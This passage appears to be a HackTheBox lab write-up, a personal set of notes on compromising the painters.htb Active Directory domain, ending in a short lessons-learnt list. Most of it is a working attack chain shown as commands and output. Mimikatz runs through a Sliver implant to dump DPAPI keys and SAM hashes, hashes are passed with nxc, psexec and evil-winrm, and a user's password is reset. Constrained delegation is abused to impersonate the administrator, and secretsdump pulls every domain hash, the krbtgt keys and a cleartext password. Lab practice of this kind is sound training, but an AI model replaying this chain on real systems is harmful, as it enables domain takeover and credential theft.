  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::dpapi

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-20


Authentication Id : 0 ; 52016 (00000000:0000cb30)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-1


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:20
SID               : S-1-5-19


Authentication Id : 0 ; 52049 (00000000:0000cb51)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-0


Authentication Id : 0 ; 50788 (00000000:0000c664)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               :


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:18
SID               : S-1-5-18
	 [00000000]
	 * GUID      :	{a72aed00-c4eb-4589-a84c-e2796c9d23fe}
	 * Time      :	08/07/2024 04:19:20
	 * MasterKey :	dd585c50101c521ed0556ae76b20946148a72c61ff9d5a152a509f591a985fa232afc8ade8db85de9bbe0789fa25d97256323404436626f6f07557a2f6445461
	 * sha1(key) :	d74c7d2cb4162368fc36744307222e6f7f309232
	 [00000001]
	 * GUID      :	{454567e5-578e-4ac0-b8d4-3c6d0be19ba9}
	 * Time      :	08/07/2024 04:19:19
	 * MasterKey :	e29d299df01c92cd50303a200c537497cebaf63bf620fa71067bde9ae28015b02792e93ac5c3392cbf6219382f9f0ec3a79a3ec27af6ca3db564d89631d6d5ad
	 * sha1(key) :	9186a7651d26c93ab4b3fd137aa9480adc288d39


mimikatz(commandline) # exit
Bye!

```



```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::dpapisystem" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::dpapisystem
DPAPI_SYSTEM
full: 6a28296d276ce0627958e99cfbcab0b54ff64355af502a3258e233f29ce3ca24257f5877965bb87d
m/u : 6a28296d276ce0627958e99cfbcab0b54ff64355 / af502a3258e233f29ce3ca24257f5877965bb87d

mimikatz(commandline) # exit
Bye!

```


```
mimikatz dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
```


```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRSVC
SysKey : b131ea5c8206a94e3d32119d035961a9
Local SID : S-1-5-21-1894836871-1209905952-3336604744

SAMKey : 21027b48a361fb0094c6eb79509e228d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6ee87fa6593a4798fe651f5f5a4e663e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a3896a66cc19131b074f0463d56587c

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2638a592bf8df16ae7a16d5f1e0ff945af694ea1cb0c96cc718f30371677dd7
      aes128_hmac       (4096) : 3e2a98999ef9cef8c1e41928257487c9
      des_cbc_md5       (4096) : fb64f42680042c52
    OldCredentials
      aes256_hmac       (4096) : 5c0ecc5dccd087cac3ec672f714c2119ab655a9f0b6b51bf75da22179dfee76a
      aes128_hmac       (4096) : d6477c485507bb6f1454cedc0af950f6
      des_cbc_md5       (4096) : ab7fe0ece5b67c5d
    OlderCredentials
      aes256_hmac       (4096) : cb7a55cfd2a867b40baa0f8148f327afce1b1b70e07a49ceecb33d3b379d42ce
      aes128_hmac       (4096) : da4f9d36f93e1c0af67f8af0805ff692
      des_cbc_md5       (4096) : e3fb1c49927a891c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : fb64f42680042c52
    OldCredentials
      des_cbc_md5       : ab7fe0ece5b67c5d


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e159b53fdb4574ab6bed0660156ffcc6

* Primary:Kerberos-Newer-Keys *
    Default Salt : SVC.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ab256c5e77a17fc0234eeada495d8ea573b2c3e90d9e5d24d2dba7d4e9792c23
      aes128_hmac       (4096) : 8d68c286c5716ed9213092b1281f24c5
      des_cbc_md5       (4096) : 1f54a21c86cbd6ef

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : SVC.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : 1f54a21c86cbd6ef


mimikatz(commandline) # exit
Bye!
```




```
kali@kali ~/H/zephyr> nxc smb 192.168.110.0/24 -u 'James' -H '8af1903d3c80d3552a84b6ba296db2ea' --local-auth
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:PNT-SVRSVC) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:False)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_PASSWORD_EXPIRED
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
SMB         192.168.110.55  445    DC               [-] DC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
```


`James:8af1903d3c80d3552a84b6ba296db2ea`



```ls
kali@kali ~/H/zephyr> nxc smb 192.168.110.53 -u 'James' -H '8af1903d3c80d3552a84b6ba296db2ea' --shares --local-auth
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)

kali@kali ~/H/zephyr> psexec.py PNT-SVRBPA/James@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
```


```
*Evil-WinRM* PS C:\Users\James\Downloads> upload ../../EVENTUAL_THROAT.exe

Info: Uploading /home/kali/HTB/zephyr/../../EVENTUAL_THROAT.exe to C:\Users\James\Downloads\EVENTUAL_THROAT.exe
Progress: 10% : |▒░░░░░░░░░|
```



```
kali@kali ~/H/zephyr> evil-winrm -i 192.168.110.53 -u 'James' -H 8af1903d3c80d3552a84b6ba296db2ea

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

```


```
Authentication Id : 0 ; 50736 (00000000:0000c630)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:24
SID               :
	msv :	
	 [00000003] Primary
	 * Username : PNT-SVRBPA$
	 * Domain   : PAINTERS
	 * NTLM     : 2dfcebbe9f5f4cb3bf98032887b3d7b6

```


```
James:8af1903d3c80d3552a84b6ba296db2ea 
PNT-SVRSVC$:c206d294c947cecc0e60955004ff96c5
PNT-SVRBPA$:2dfcebbe9f5f4cb3bf98032887b3d7b6
```



```
kali@kali ~> bloodyAD -v DEBUG --host "192.168.110.55" -d "painters.htb" -u 'PNT-SVRBPA$' -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 set password blake 'Fuckyou123$!#'
[+] Password changed successfully!
```



```
kali@kali ~> findDelegation.py 'painters.htb'/'blake':'Fuckyou123$!#'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName  AccountType  DelegationType                      DelegationRightsTo
-----------  -----------  ----------------------------------  --------------------
blake        Person       Constrained w/ Protocol Transition  CIFS/dc.painters.htb
blake        Person       Constrained w/ Protocol Transition  CIFS/DC
daniel       Person       Constrained                         CIFS/dc.painters.htb
daniel       Person       Constrained                         CIFS/DC

```


```
kali@kali ~> getST.py -spn 'CIFS/dc.painters.htb' -impersonate 'administrator' 'painters.htb/blake:Fuckyou123!#'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache

```




```
kali@kali ~> secretsdump.py -k DC.painters.htb -dc-ip 192.168.110.55
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
PAINTERS\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f
PAINTERS\DC$:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xfecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3
dpapi_userkey:0x6130d2e50c7b21539230412422edeb0071253077
[*] NL$KM
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::
riley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
blake:1107:aad3b435b51404eeaad3b435b51404ee:c5b08ab64bce42c5de18e5c6737f29e4:::
gavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::
daniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::
tom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::
web_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
painters.htb\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
PNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
PNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
PNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::
MAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::
WORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::
ZSM$:2102:aad3b435b51404eeaad3b435b51404ee:ac3dc8835f4638b5f1a429ec03f96f16:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
Administrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492
Administrator:des-cbc-md5:807c2a64b3c8b379
krbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
krbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd
krbtgt:des-cbc-md5:25f2432654101f40
riley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360
riley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec
riley:des-cbc-md5:3e018f85012cc8b0
blake:aes256-cts-hmac-sha1-96:cec117bcc1795fff513430b4e022e74ab24c745267e8a342a5bc32ae793be326
blake:aes128-cts-hmac-sha1-96:44e52432c901320be2b880e8788f0872
blake:des-cbc-md5:38983efb57802c70
gavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992
gavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300
gavin:des-cbc-md5:b54f67f19d8ab367
daniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd
daniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e
daniel:des-cbc-md5:a7455b207f1570ad
tom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888
tom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c
tom:des-cbc-md5:2aea89cb23b6f246
web_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8
web_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0
web_svc:des-cbc-md5:e6b986ae31e34a20
painters.htb\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03
painters.htb\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7
painters.htb\Matt:des-cbc-md5:624c3458945b4675
DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
DC$:des-cbc-md5:5e3b4cb002b3f289
PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b
PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
PNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0
PNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6
PNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7
PNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f
MAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c
MAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c
MAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334
WORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0
WORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87
WORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62
ZSM$:aes256-cts-hmac-sha1-96:76b4baa42c3474c5118ffc857bab5201d813cccc5fce896515b3de6c5ee95e9a
ZSM$:aes128-cts-hmac-sha1-96:165c20312c4240980ac04b058edfd068
ZSM$:des-cbc-md5:b58045b043c48997
[*] ClearText passwords grabbed
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!

```


```
kali@kali ~>   nxc smb DC.painters.htb -u 'administrator' -H '5bdd6a33efe43f0dc7e3b2435579aa53'
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:False)
SMB         192.168.110.55  445    DC               [+] painters.htb\administrator:5bdd6a33efe43f0dc7e3b2435579aa53 (Pwn3d!)

```


```
kali@kali ~> psexec.py painters.htb/administrator@DC.painters.htb -hashes :5bdd6a33efe43f0dc7e3b2435579aa53
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on DC.painters.htb.....
[*] Found writable share ADMIN$
[*] Uploading file cwJKyCWB.exe
[*] Opening SVCManager on DC.painters.htb.....
[*] Creating service pzeK on DC.painters.htb.....
[*] Starting service pzeK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


```
*Evil-WinRM* PS C:\Users\Administrator\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos>  Get-DomainComputer -Unconstrained | select dnshostname,samaccountname,useraccountcontrol

dnshostname     samaccountname                           useraccountcontrol
-----------     --------------                           ------------------
DC.painters.htb DC$            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

```





---


# things learnt

check the /etc/hosts to see what the network looks like

check if evil-winrm works using nxc

- check every exec
	- smb
	- at
	- wmi
- Mimikatz
	- lsassdump 
	- sekurlsa
	- read the difference
- ENUMERATE
- LISTNE TO HINTS DONT GO ON WILD GOOSE CHASES
